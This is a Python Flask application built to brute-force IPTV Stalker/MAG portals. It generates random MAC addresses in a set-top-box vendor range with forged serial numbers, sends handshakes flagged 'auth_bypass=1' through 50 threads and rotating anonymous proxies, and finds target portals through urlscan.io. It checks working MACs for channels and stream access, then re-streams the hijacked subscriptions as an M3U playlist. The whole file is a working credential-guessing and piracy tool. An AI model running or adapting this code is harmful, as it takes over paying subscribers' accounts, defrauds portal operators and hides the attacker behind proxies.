import os
import requests
import random
import threading
import time
import logging
import json
import re
from urllib.parse import urlparse, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from flask import Flask, render_template, request, jsonify, Response, abort, redirect

# ============================================
# LOGGING & APP SETUP
# ============================================
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
app = Flask(__name__, template_folder='templates')

# ============================================
# CONFIGURATION
# ============================================
MAX_WORKERS = 50
EXECUTOR = ThreadPoolExecutor(max_workers=MAX_WORKERS)
FAST_TIMEOUT = 3
HEAVY_TIMEOUT = 10
PROXY_REFRESH_INTERVAL = 60 * 60  # 60 minutes for proxy refresh
CSV_PROXY_FILE = "fast_anonymous_http_proxies.csv"  # Produced by your async collector

# --- Proxy Management ---
PROXY_LIST = []          # List of "http://IP:PORT"
proxy_index = 0
proxy_lock = threading.Lock()
last_proxy_refresh_time = 0
proxy_manager_thread = None  # Background CSV loader

# --- Headers and Agents ---
STB_USER_AGENTS = [
    "Mozilla/5.0 (QtEmbedded; MAG254 stb) WebKit", "MAG250",
    "AuraHD", "Mozilla/5.0 (QtEmbedded; Stb-platform; Opera/12.16) WebKit/534.46", "MAG254",
]
STB_COOKIES = {"stb_lang": "en"}

# ============================================
# GLOBAL STATE & THREAD SAFETY
# ============================================
scan_state = {
    "running": False,
    "target_url": None,
    "attempts": 0,
    "found_macs": [],
    "logs": [],
    "thread": None
}
mac_channel_cache = {}
state_lock = threading.Lock()

proxy_state = {
    "mac": None,
    "portal": None,
    "token": None,
    "user_agent": None,
    "last_token_time": 0,
    "channels": [],
    "last_channels_fetch": 0,
    "session": requests.Session(),
    "proxy": None
}
PROXY_SESSION_LIFETIME = 3000
PROXY_CHANNELS_REFRESH = 1800
proxy_thread = None  # streaming-channel refresh worker

# ============================================
# PROXY CSV LOADER & MANAGER
# ============================================

def load_proxies_from_csv(path=CSV_PROXY_FILE):
    """
    Load HTTP proxies from CSV written by the async collector.
    Expected format:
        Proxy,Latency
        123.45.67.89:8080,0.42s
    We convert to: "http://123.45.67.89:8080"
    """
    proxies = []
    if not os.path.exists(path):
        logging.warning(f"[PROXY CSV] File not found: {path}")
        return proxies

    try:
        with open(path, "r", encoding="utf-8") as f:
            # Skip header
            next(f, None)
            for line in f:
                parts = line.strip().split(",")
                if not parts:
                    continue
                ip_port = parts[0].strip()
                if not ip_port:
                    continue

                # Use only HTTP scheme as requested
                if not ip_port.startswith("http://"):
                    ip_port = "http://" + ip_port

                proxies.append(ip_port)

        logging.info(f"[PROXY CSV] Loaded {len(proxies)} proxies from {path}")
    except Exception as e:
        logging.error(f"[PROXY CSV] Error reading {path}: {e}")
        return []

    return proxies


def proxy_refresh_worker():
    """
    Periodically reloads PROXY_LIST from the CSV file produced by
    your async proxy collector script.
    No scraping or testing here – just reading from disk.
    """
    global PROXY_LIST, last_proxy_refresh_time

    while True:
        logging.info("[PROXY MANAGER] Reloading proxies from CSV...")
        new_proxies = load_proxies_from_csv()

        with proxy_lock:
            PROXY_LIST = new_proxies
            last_proxy_refresh_time = time.time()

        logging.info(f"[PROXY MANAGER] Proxy pool size: {len(PROXY_LIST)}")

        time.sleep(PROXY_REFRESH_INTERVAL)


def get_next_proxy():
    """
    Cycles through the PROXY_LIST in a thread-safe manner.
    Returns:
        proxies dict for requests: {"http": "http://IP:PORT"}
        raw proxy url: "http://IP:PORT"
    """
    global proxy_index
    with proxy_lock:
        if not PROXY_LIST:
            return None, None

        proxy_url = PROXY_LIST[proxy_index % len(PROXY_LIST)]
        proxy_index = (proxy_index + 1) % len(PROXY_LIST)

        return {"http": proxy_url}, proxy_url


def get_display_proxy(proxy_url):
    """Cleans up the proxy URL for display in the logs/UI."""
    if not proxy_url:
        return 'N/A'
    parsed = urlparse(proxy_url)
    return f"{parsed.hostname}:{parsed.port}" if parsed.hostname else proxy_url.split('@')[-1]

# ============================================
# UTILITIES & HELPERS
# ============================================

def clean_url(url):
    """Ensure URL has proper scheme and no trailing slash."""
    parsed = urlparse(url)
    if not parsed.scheme:
        parsed = parsed._replace(scheme="http")
    return parsed.scheme + "://" + parsed.netloc.rstrip('/')


def generate_mac():
    """Generate MAC in valid MAG vendor range and return SN/DevID1 for Enhanced Auth."""
    mac_bytes = [random.randint(0, 255) for _ in range(3)]
    mac_end = f"{mac_bytes[0]:02X}:{mac_bytes[1]:02X}:{mac_bytes[2]:02X}"
    mac = f"00:1A:79:{mac_end}"

    sn_suffix = f"{mac_bytes[0]:02X}{mac_bytes[1]:02X}{mac_bytes[2]:02X}"
    sn = f"1610425{sn_suffix}"
    devid1 = f"{random.randint(100000, 999999)}{random.randint(1000, 9999)}"

    return mac, sn, devid1


def check_portal_candidate(url):
    """Checks if a single URL is reachable with STB headers and returns the cleaned URL."""
    cleaned_url = clean_url(url)
    proxies, _ = get_next_proxy()
    try:
        r = requests.get(
            cleaned_url,
            headers={"User-Agent": STB_USER_AGENTS[0]},
            timeout=FAST_TIMEOUT,
            proxies=proxies
        )
        if r.status_code < 400 or r.is_redirect:
            return cleaned_url
    except requests.exceptions.RequestException:
        pass
    return None

# ============================================
# CORE SCANNER LOGIC
# ============================================

def test_mac(portal_url, mac, sn, devid1):
    """Tests Handshake + Profile with Enhanced Auth and rotating proxy."""
    final_token, final_expires, final_ua = None, None, None
    proxies, proxy_url = get_next_proxy()

    for ua in STB_USER_AGENTS:
        session = requests.Session()
        session.headers.update({"User-Agent": ua})
        session.cookies.update(STB_COOKIES)
        session.cookies.set("mac", mac)

        base_url = f"{portal_url}/server/load.php?type=stb"
        handshake_url = (
            f"{base_url}&action=handshake&sn={sn}&device_id={devid1}"
            f"&hd=1&auth_bypass=1&ver=Infomir_API"
        )

        try:
            res = session.get(handshake_url, timeout=FAST_TIMEOUT, proxies=proxies)
            res.raise_for_status()

            js = res.json().get("js", {})
            token = js.get("token")
            expires = js.get("expires") or js.get("valid_through")

            if token and len(token) >= 5:
                final_token, final_expires, final_ua = token, expires, ua
                break
        except (requests.exceptions.RequestException, ValueError, KeyError):
            continue

    if not final_token:
        return False, None, None, None, proxy_url

    # 2. Profile Retrieval
    try:
        profile_url = f"{base_url}&action=get_profile&sn={sn}&device_id={devid1}"
        session.headers.update({"Authorization": f"Bearer {final_token}"})
        pr = session.get(profile_url, timeout=FAST_TIMEOUT, proxies=proxies)
        pr.raise_for_status()

        profile = pr.json().get("js", {})
        if not any(k in profile for k in ["status", "phone", "connected", "packages", "allowed_stb"]):
            return False, None, None, None, proxy_url

        return True, final_token, final_expires, final_ua, proxy_url

    except Exception:
        return False, None, None, None, proxy_url


def fetch_channels(portal_url, mac, token, user_agent, current_proxy):
    """Fetches ALL channels (heavy request) using the assigned proxy."""
    headers = {"user-agent": user_agent, "Authorization": f"Bearer {token}"}
    cookies = {"mac": mac, "stb_lang": "en"}
    url = f"{portal_url}/server/load.php?type=itv&action=get_all_channels"

    proxies = {"http": current_proxy} if current_proxy else None

    try:
        r = requests.get(url, headers=headers, cookies=cookies, timeout=HEAVY_TIMEOUT, proxies=proxies)
        r.raise_for_status()

        raw = r.json().get("js", {}).get("data", [])
        cleaned = []
        for ch in raw:
            cmd = ch.get("cmd", "")
            if not cmd:
                continue
            stream = cmd.split("ffmpeg ", 1)[1].strip() if "ffmpeg " in cmd else cmd.strip()
            if not stream or not any(proto in stream for proto in ["http", "rtmp", "udp", "rtsp"]):
                continue
            cleaned.append({
                "id": str(ch.get("id", "")),
                "name": ch.get("name", ""),
                "cmd": cmd,
                "url": stream
            })
        return cleaned

    except Exception:
        return []


def test_stream_auth(portal_url, mac, token, user_agent, channel_cmd, current_proxy):
    """Tests stream authorization using the assigned proxy."""
    session = requests.Session()
    session.headers.update({
        "User-Agent": user_agent,
        "Authorization": f"Bearer {token}",
        "Referer": portal_url + "/"
    })
    session.cookies.set("mac", mac)
    session.cookies.set("stb_lang", "en")

    proxies = {"http": current_proxy} if current_proxy else None
    cmd_clean = channel_cmd.replace('ffmpeg ', '').replace('auto ', '').strip()

    url = f"{portal_url}/server/load.php"
    params = {
        "type": "itv",
        "action": "create_link",
        "cmd": cmd_clean,
        "JsHttpRequest": "1-xml"
    }

    try:
        r = session.get(url, params=params, timeout=FAST_TIMEOUT, proxies=proxies)
        r.raise_for_status()

        js = r.json().get("js", {})
        stream_url = js.get("cmd") or js.get("url")

        if stream_url and any(proto in stream_url for proto in ["http", "rtmp", "udp", "rtsp"]):
            return True
        return False

    except requests.exceptions.RequestException:
        return False


# ============================================
# SCAN WORKER THREAD
# ============================================

def scan_worker():
    """Worker function for the concurrent MAC scan."""
    while True:
        with state_lock:
            if not scan_state["running"]:
                break
            portal = scan_state["target_url"]
            scan_state["attempts"] += 1
            attempt = scan_state["attempts"]

        mac, sn, devid1 = generate_mac()

        # STAGE 1: Test Login/Profile
        valid, token, exp, ua, proxy_url = test_mac(portal, mac, sn, devid1)
        proxy_display = get_display_proxy(proxy_url)

        with state_lock:
            if not valid:
                scan_state["logs"].append(
                    f"attempt #{attempt}: testing {mac} (via {proxy_display}) ... fail (Stage 1)"
                )
                continue

            # STAGE 2 & 3: Channel Fetch & Stream Auth
            channels = fetch_channels(portal, mac, token, ua, proxy_url)

            if len(channels) == 0:
                scan_state["logs"].append(
                    f"attempt #{attempt}: {mac} VALID login but 0 channels returned (via {proxy_display}) → rejected (Stage 2)"
                )
                continue

            first_channel_cmd = channels[0]["cmd"]
            stream_auth_ok = test_stream_auth(portal, mac, token, ua, first_channel_cmd, proxy_url)

            if not stream_auth_ok:
                scan_state["logs"].append(
                    f"attempt #{attempt}: {mac} VALID login/channels, but FAILED stream auth (via {proxy_display}) → rejected (Stage 3)"
                )
                continue

            # SUCCESS
            display = f"{portal} {mac} (Proxy: {proxy_display}) - {len(channels)} channels"

            if mac not in mac_channel_cache:
                scan_state["found_macs"].append(display)
                mac_channel_cache[mac] = {
                    "mac": mac,
                    "portal": portal,
                    "token": token,
                    "user_agent": ua,
                    "expires": exp,
                    "channels": channels,
                    "proxy": proxy_url
                }

            scan_state["logs"].append(
                f"attempt #{attempt}: {mac} ... FULL SUCCESS! ({len(channels)} channels via {proxy_display})"
            )

            if len(scan_state['logs']) > 200:
                scan_state['logs'].pop(0)


# ============================================
# PROXY MODE FUNCTIONS (for streaming)
# ============================================

def proxy_get_token():
    """Refreshes the token for the single active proxy MAC."""
    global proxy_state
    now = time.time()
    if proxy_state["token"] and now - proxy_state["last_token_time"] < PROXY_SESSION_LIFETIME:
        return proxy_state["token"]

    portal, mac, ua = proxy_state["portal"], proxy_state["mac"], proxy_state["user_agent"]
    current_proxy = proxy_state["proxy"]

    proxies = {"http": current_proxy} if current_proxy else None

    proxy_state["session"].headers.update({"User-Agent": ua, "Referer": portal + "/"})
    proxy_state["session"].cookies.set("mac", mac)
    proxy_state["session"].cookies.set("stb_lang", "en")

    # Re-generate SN/DevID1 for handshake
    mac_bytes = [int(p, 16) for p in mac.split(':')[-3:]]
    sn_suffix = f"{mac_bytes[0]:02X}{mac_bytes[1]:02X}{mac_bytes[2]:02X}"
    sn = f"1610425{sn_suffix}"
    devid1 = f"{random.randint(100000, 999999)}{random.randint(1000, 9999)}"

    handshake_url = (
        f"{portal}/server/load.php?type=stb&action=handshake"
        f"&sn={sn}&device_id={devid1}&hd=1&auth_bypass=1&ver=Infomir_API"
    )

    try:
        r = proxy_state["session"].get(handshake_url, timeout=10, proxies=proxies)
        r.raise_for_status()
        js = r.json().get("js", {})
        token = js.get("token")

        if not token:
            return None

        proxy_state["token"] = token
        proxy_state["last_token_time"] = now
        proxy_state["session"].headers.update({"Authorization": f"Bearer {token}"})
        logging.info(f"[PROXY] Token refreshed successfully.")
        return token
    except Exception as e:
        logging.error(f"[PROXY ERROR] Token refresh failed: {e}")
        return None


def proxy_fetch_channels_worker():
    """Background thread to periodically fetch all channels for the active proxy MAC."""
    global proxy_state
    while proxy_state["mac"]:
        token = proxy_get_token()
        if not token:
            time.sleep(60)
            continue

        current_proxy = proxy_state["proxy"]
        proxies = {"http": current_proxy} if current_proxy else None
        url = f"{proxy_state['portal']}/server/load.php?type=itv&action=get_all_channels"

        try:
            r = proxy_state["session"].get(url, timeout=30, proxies=proxies)
            r.raise_for_status()

            data = r.json().get("js", {}).get("data", [])
            channels = []
            for ch in data:
                cmd = ch.get("cmd", "")
                if not cmd:
                    continue
                stream = cmd.split("ffmpeg ", 1)[1].strip() if "ffmpeg " in cmd else cmd.strip()

                if not stream or not any(proto in stream for proto in ["http", "rtmp", "udp", "rtsp"]):
                    continue

                channels.append({
                    "id": str(ch["id"]),
                    "name": ch.get("name", "").strip(),
                    "url": stream,
                    "cmd": cmd
                })

            proxy_state["channels"] = channels
            proxy_state["last_channels_fetch"] = time.time()
            logging.info(f"[PROXY] Loaded {len(channels)} channels.")

        except Exception as e:
            logging.error(f"[PROXY ERROR] Cannot load channels: {e}")

        time.sleep(PROXY_CHANNELS_REFRESH)


# ============================================
# FLASK ROUTES
# ============================================

@app.after_request
def after_request(response):
    response.headers.add("Access-Control-Allow-Origin", "*")
    response.headers.add("Access-Control-Allow-Headers", "Content-Type")
    response.headers.add("Access-Control-Allow-Methods", "GET")
    return response


@app.route("/")
def index():
    """Render the separate HTML template for the UI."""
    return render_template("index.html")


@app.route("/start", methods=["POST"])
def start_scan():
    portal_url = request.form.get("portal_url", "").strip()
    if not portal_url:
        return jsonify({"error": "Missing URL"}), 400

    portal_url = clean_url(portal_url)

    global scan_state
    with state_lock:
        if scan_state["running"]:
            return jsonify({"status": "already running"}), 409

        scan_state["running"] = True
        scan_state["target_url"] = portal_url
        scan_state["attempts"] = 0
        scan_state["logs"] = [
            f"Starting high-speed scan on {portal_url}.",
            f"Using {len(PROXY_LIST)} rotating proxies (N/A if 0).",
            "3-Stage check, Enhanced Auth active."
        ]

        for i in range(MAX_WORKERS):
            EXECUTOR.submit(scan_worker)

    return jsonify({"status": "scan started"})


@app.route("/stop", methods=["POST"])
def stop_scan():
    global scan_state
    with state_lock:
        if scan_state["running"]:
            scan_state["running"] = False
            scan_state["logs"].append("Scan stopped by user.")
        else:
            return jsonify({"status": "already stopped"}), 409
    return jsonify({"status": "scan stopped"})


@app.route("/status")
def status():
    global scan_state, proxy_state
    with state_lock:
        found_data = []
        for mac, details in mac_channel_cache.items():
            proxy_display = get_display_proxy(details["proxy"])
            found_data.append({
                "mac": mac,
                "portal": details["portal"],
                "expires": details["expires"] or "N/A",
                "proxy_used": proxy_display,
                "working_channels_count": len(details["channels"])
            })

        return jsonify({
            "running": scan_state["running"],
            "attempts": scan_state["attempts"],
            "found": found_data,
            "logs": list(scan_state["logs"]),
            "full_cache": mac_channel_cache,
            "proxy_mac": proxy_state["mac"],
            "proxy_portal": proxy_state["portal"],
            "proxy_channels": len(proxy_state["channels"])
        })


@app.route("/fetch-urls")
def fetch_urls():
    """Fetches portals from urlscan.io, filters, and verifies reachability concurrently."""
    api_url = "https://urlscan.io/api/v1/search/?q=filename:keydown.keycodes.js"
    all_urls = set()
    working_urls = []

    proxies, _ = get_next_proxy()  # Use a rotating proxy for the API call

    # 1. Fetch URLs from API (Synchronous)
    try:
        res = requests.get(api_url, timeout=HEAVY_TIMEOUT, proxies=proxies)
        res.raise_for_status()

        if not res.headers.get('Content-Type', '').startswith('application/json'):
            logging.error("URLScan returned non-JSON content. Likely rate limited.")
            return jsonify(working_urls)

        data = res.json()

        for result in data.get('results', []):
            page_url = result.get('page', {}).get('url')
            if page_url:
                parsed = urlparse(page_url)
                hostname = parsed.netloc.split(':')[0]
                dot_count = hostname.count('.')
                if dot_count < 1 or (dot_count == 3 and all(p.isdigit() for p in hostname.split('.'))):
                    continue
                base_url = clean_url(urlunparse((parsed.scheme, parsed.netloc, '', '', '', '')))
                all_urls.add(base_url)

    except requests.exceptions.RequestException as e:
        logging.error(f"URLScan API fetch failed: {str(e)}")
        return jsonify(working_urls)
    except json.JSONDecodeError:
        logging.error("URLScan API fetch failed due to invalid JSON.")
        return jsonify(working_urls)

    # 2. Verify Reachability (Concurrent/Parallel)
    futures = [EXECUTOR.submit(check_portal_candidate, url) for url in all_urls]
    for future in as_completed(futures):
        result = future.result()
        if result and result not in working_urls:
            working_urls.append(result)

    return jsonify(working_urls)


@app.route('/api/proxy_status')
def proxy_status():
    """API endpoint to check the proxy manager status."""
    global PROXY_LIST, last_proxy_refresh_time, proxy_manager_thread

    with proxy_lock:
        available_count = len(PROXY_LIST)

    manager_status = 'Inactive'
    if proxy_manager_thread and proxy_manager_thread.is_alive():
        manager_status = 'Active'

    return jsonify({
        'status': 'Running' if scan_state['running'] else 'Idle',
        'available_proxies': available_count,
        'proxy_pool_status': 'OK' if available_count > 0 else 'EMPTY',
        'manager_thread': manager_status,
        'refresh_interval': f"{PROXY_REFRESH_INTERVAL // 60} minutes",
        'last_refresh': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(last_proxy_refresh_time)) if last_proxy_refresh_time else 'Never',
    })


@app.route("/proxy/start/<mac>")
def start_proxy(mac):
    """Activates proxy mode for a found MAC."""
    global proxy_state, proxy_thread
    mac_fmt = mac.upper().replace("-", ":")

    if mac_fmt not in mac_channel_cache:
        return jsonify({"error": "MAC not found in cache. Run scanner first."}), 404

    details = mac_channel_cache[mac_fmt]

    if proxy_thread and proxy_thread.is_alive() and proxy_state["mac"]:
        if proxy_state["mac"] != mac_fmt:
            logging.info("[PROXY] Stopping existing proxy stream thread.")
            proxy_state["mac"] = None  # Signal the worker to stop

    proxy_state.update({
        "mac": mac_fmt,
        "portal": details["portal"],
        "user_agent": details["user_agent"],
        "token": details["token"],
        "last_token_time": time.time(),
        "channels": details["channels"],
        "last_channels_fetch": time.time(),
        "session": requests.Session(),
        "proxy": details["proxy"]
    })

    proxy_thread = threading.Thread(target=proxy_fetch_channels_worker, daemon=True)
    proxy_thread.start()

    logging.info(f"[PROXY] Started proxy for {mac_fmt} on {details['portal']}.")

    return jsonify({
        "status": "proxy started",
        "mac": mac_fmt,
        "portal": details["portal"],
        "playlist_url": f"/proxy/playlist.m3u",
        "channels_count": len(details["channels"])
    })


@app.route("/proxy/playlist.m3u")
def proxy_playlist():
    """Generates an M3U playlist pointing to our stream proxy endpoint."""
    if not proxy_state["mac"]:
        abort(404, "Proxy is not active for a MAC.")

    base = request.host_url.rstrip("/")
    lines = ["#EXTM3U"]

    if not proxy_state["channels"]:
        lines.append(f"#EXTINF:-1,NO CHANNELS LOADED")
        lines.append(f"{base}/stream/0")
        return Response("\n".join(lines), mimetype="audio/x-mpegurl")

    for c in proxy_state["channels"]:
        lines.append(f'#EXTINF:-1 tvg-id="{c["id"]}",{c["name"]}')
        lines.append(f"{base}/proxy/stream/{c['id']}")

    return Response("\n".join(lines), mimetype="audio/x-mpegurl")


@app.route("/proxy/stream/<cid>")
def proxy_stream(cid):
    """Proxies the raw stream URL from the active portal."""
    if not proxy_state["mac"]:
        abort(503, "Proxy not active.")

    ch = next((x for x in proxy_state["channels"] if x["id"] == cid), None)
    if not ch:
        abort(404, "Channel not found or not loaded.")

    stream_url = ch["url"]
    token = proxy_get_token()
    if not token:
        abort(503, "Failed to refresh token for stream.")

    stream_headers = {
        "User-Agent": proxy_state["user_agent"],
        "Authorization": f"Bearer {token}",
        "Referer": proxy_state["portal"] + "/"
    }

    current_proxy = proxy_state["proxy"]
    proxies = {"http": current_proxy} if current_proxy else None

    def generate():
        try:
            with proxy_state["session"].get(stream_url, headers=stream_headers, stream=True, timeout=10, proxies=proxies) as r:
                r.raise_for_status()
                for chunk in r.iter_content(chunk_size=65536):
                    if chunk:
                        yield chunk
        except Exception as e:
            logging.error(f"[STREAM PROXY ERROR {cid}] {e}")

    return Response(generate(), mimetype="video/mp2t")


# ============================================
# MAIN EXECUTION
# ============================================

if __name__ == "__main__":
    logging.info("Starting proxy manager (CSV-based) in background thread...")

    proxy_manager_thread = threading.Thread(target=proxy_refresh_worker, daemon=True)
    proxy_manager_thread.start()

    # Optional: small delay so first CSV load has a chance to run
    time.sleep(3)

    logging.info("Proxy manager running. Starting Flask app now.")
    app.run(host="0.0.0.0", port=5000, threaded=True, debug=True, use_reloader=False)
